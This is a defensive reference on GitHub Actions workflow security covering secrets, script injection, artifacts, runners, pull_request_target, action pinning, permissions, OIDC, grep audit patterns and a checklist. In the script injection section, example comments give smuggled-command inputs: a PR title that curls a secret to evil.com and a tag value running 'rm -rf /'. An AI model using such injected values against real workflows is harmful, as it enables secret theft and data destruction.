# GitHub Actions Security Reference

## Overview

GitHub Actions workflows execute arbitrary code with access to secrets, infrastructure, and deployment targets. Misconfigurations can leak credentials, allow code injection, or grant attackers access to production environments.

---

## Secrets in Workflows

```yaml
# VULNERABLE: Hardcoded secrets in workflow file
env:
  DB_PASSWORD: "mysecretpassword"
  API_KEY: "sk-12345"

# VULNERABLE: Secrets echoed in logs
- run: |
    echo $SECRET_TOKEN  # Visible in step logs
    curl -H "Authorization: Bearer $API_KEY" https://api.example.com | tee output.log

# SAFE: Use repository/org secrets (Settings > Secrets and variables > Actions)
- run: curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://api.example.com > /dev/null
```

### Secret Configuration

| Setting                  | Purpose                            | When to Use                            |
| ------------------------ | ---------------------------------- | -------------------------------------- |
| **Repository secrets**   | Available to all workflows in repo | Default for most secrets               |
| **Environment secrets**  | Scoped to a specific environment   | Production deploy keys, release tokens |
| **Organization secrets** | Shared across repos                | Shared infrastructure credentials      |

```yaml
# VULNERABLE: Secret exposed via echo or set-output
- run: echo "token=${{ secrets.TOKEN }}" >> $GITHUB_OUTPUT # Masked, but avoid

# FLAG: Any direct interpolation of secrets into shell strings
- run: my-tool --key ${{ secrets.API_KEY }} # Injection risk if value contains shell metacharacters

# SAFE: Pass secrets via environment variables
- run: my-tool --key "$KEY"
  env:
    KEY: ${{ secrets.API_KEY }}
```

---

## Script Injection

Attacker-controlled GitHub context values used in `run:` steps can execute arbitrary commands.

### Attacker-Controlled Context Values

| Expression                        | Source         | Risk            |
| --------------------------------- | -------------- | --------------- |
| `github.event.issue.title`        | Issue title    | Any contributor |
| `github.event.issue.body`         | Issue body     | Any contributor |
| `github.event.pull_request.title` | PR title       | PR author       |
| `github.event.pull_request.body`  | PR description | PR author       |
| `github.head_ref`                 | Branch name    | Branch creator  |
| `github.event.comment.body`       | Comment text   | Any commenter   |

```yaml
# VULNERABLE: Unescaped expression in run step
- run: echo "PR title is ${{ github.event.pull_request.title }}"
  # Attacker PR title: "; curl http://evil.com/steal?token=$SECRET"

# VULNERABLE: Expression used in shell command
- run: git tag -a "${{ github.event.release.tag_name }}" -m "Release"
  # Attacker tag: "; rm -rf /"

# SAFE: Pass attacker-controlled values via env vars (shell handles them safely)
- run: echo "PR title is $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}

# SAFE: Use server-controlled context values instead
- run: echo "SHA is ${{ github.sha }}" # Server-controlled, safe
- run: echo "Repo is ${{ github.repository }}" # Server-controlled, safe
```

---

## Artifact Security

```yaml
# VULNERABLE: Sensitive data in artifacts (accessible to anyone with repo access)
- uses: actions/upload-artifact@v4
  with:
    name: build-output
    path: |
      .env
      credentials.json
      coverage/  # May contain source code paths

# VULNERABLE: Public artifacts on public repos — anyone can download
- uses: actions/upload-artifact@v4
  with:
    name: build
    path: dist/

# SAFE: Restrict artifact content and set retention
- uses: actions/upload-artifact@v4
  with:
    name: test-results
    path: test-results/
    retention-days: 7
```

---

## Runner Security

```yaml
# VULNERABLE: Self-hosted runners processing untrusted PRs from forks
on:
  pull_request:
    # Any fork can trigger this on your self-hosted runner

# FLAG: Self-hosted runners on public repos — fork PRs can execute arbitrary code on your infrastructure

# SAFE: Use GitHub-hosted runners for untrusted fork PR workflows
runs-on: ubuntu-latest

# SAFE: Restrict self-hosted runners to internal/trusted PRs only
on:
  pull_request_target:  # Note: still requires care — see pull_request_target risks below
```

---

## pull_request_target Risks

```yaml
# VULNERABLE: Checking out untrusted code in pull_request_target context
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS: runs attacker code with base repo secrets
      - run: npm build  # Attacker controls package.json

# SAFE: Only use pull_request_target for labeling, commenting — never checkout untrusted code
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v4  # No checkout needed
```

---

## Third-Party Actions

```yaml
# VULNERABLE: Using actions without pinning to a commit SHA
- uses: some-org/some-action@main # Could change at any time
- uses: some-org/some-action@v1 # Tag can be force-pushed

# SAFE: Pin to a specific commit SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# VULNERABLE: Using unvetted third-party actions
- uses: random-person/cool-action@v1 # Unknown code running with your secrets

# SAFE: Prefer GitHub-maintained or well-audited actions; pin SHA regardless
```

---

## Permissions

```yaml
# VULNERABLE: Default (or overly broad) permissions
jobs:
  build:
    runs-on: ubuntu-latest
    # No permissions block — inherits repo-level defaults, may include write access

# SAFE: Explicitly declare minimal permissions
permissions:
  contents: read

# SAFE: Per-job permissions
jobs:
  deploy:
    permissions:
      id-token: write   # OIDC token for cloud auth
      contents: read

# SAFE: Deny all at top level, grant only what each job needs
permissions: {}
jobs:
  build:
    permissions:
      contents: read
```

---

## OIDC / Cloud Authentication

```yaml
# VULNERABLE: Long-lived static credentials stored as secrets
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

# SAFE: Use OIDC for short-lived tokens (no static credentials)
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789:role/deploy-role
    aws-region: us-east-1
    # GitHub provides OIDC token; AWS validates and issues temp credentials
```

---

## Grep Patterns

```bash
# Script injection — attacker-controlled expressions in run steps
grep -rn "github.event.pull_request.title\|github.event.issue.body\|github.head_ref\|github.event.comment.body" .github/workflows/

# Unpinned third-party actions
grep -rn "uses:.*@main\|uses:.*@master\|uses:.*@v[0-9]" .github/workflows/

# Hardcoded secrets
grep -rn "password\|secret\|api_key\|token.*=" .github/workflows/

# pull_request_target + checkout (dangerous combo)
grep -rn "pull_request_target" .github/workflows/ | xargs -I {} grep -l "checkout"

# Missing permissions block
grep -L "permissions:" .github/workflows/*.yml

# Static cloud credentials
grep -rn "AWS_ACCESS_KEY_ID\|AWS_SECRET_ACCESS_KEY\|GOOGLE_APPLICATION_CREDENTIALS" .github/workflows/
```

---

## Testing Checklist

- [ ] No hardcoded secrets in workflow files
- [ ] All attacker-controlled context values passed via env vars, not interpolated directly
- [ ] Third-party actions pinned to commit SHA
- [ ] `pull_request_target` never checks out untrusted fork code
- [ ] Self-hosted runners not used for public repo fork PRs
- [ ] Minimal `permissions:` declared at job level
- [ ] OIDC used for cloud auth instead of static credentials
- [ ] No sensitive data in artifacts
- [ ] Artifact retention limited to what is needed

---

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [GitHub Actions: Keeping your GitHub Actions and workflows secure](https://github.blog/security/supply-chain-security/keeping-your-github-actions-and-workflows-secure-part-1-preventing-pwn-requests/)
